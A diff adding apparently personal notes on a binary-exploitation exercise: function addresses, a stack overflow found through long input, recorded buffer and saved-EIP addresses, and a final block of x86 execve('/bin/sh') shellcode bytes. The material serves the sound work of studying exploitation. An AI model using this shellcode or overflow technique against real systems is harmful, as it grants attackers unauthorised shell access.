@@ -1,0 +1,27 @@
+1)	first impressions
+		-functions	
+			-main
+			-p		0x080484b4
+			-pp		0x0804851e
+			-strcpy, strcat, strchr, read, puts, strncpy
+		-behavior
+			=> reads for 2 separate inputs on stdin, then prints them on stdout
+			=> large input = segfault (some overflow)
+	
+
+2)	inside 
+
+
+dest1 == 0xffffce38 
+dest2 == 0xffffce4c
+
+arg0 strcpy pp == 0xffffce86
+	=> stores the two strings we read
+
+ebp + 8 == 0xffffce70
+	=> value == 0xffffce86 == start buf pp
+
+main sEIP = 0xffffcebc
+
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69
+\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
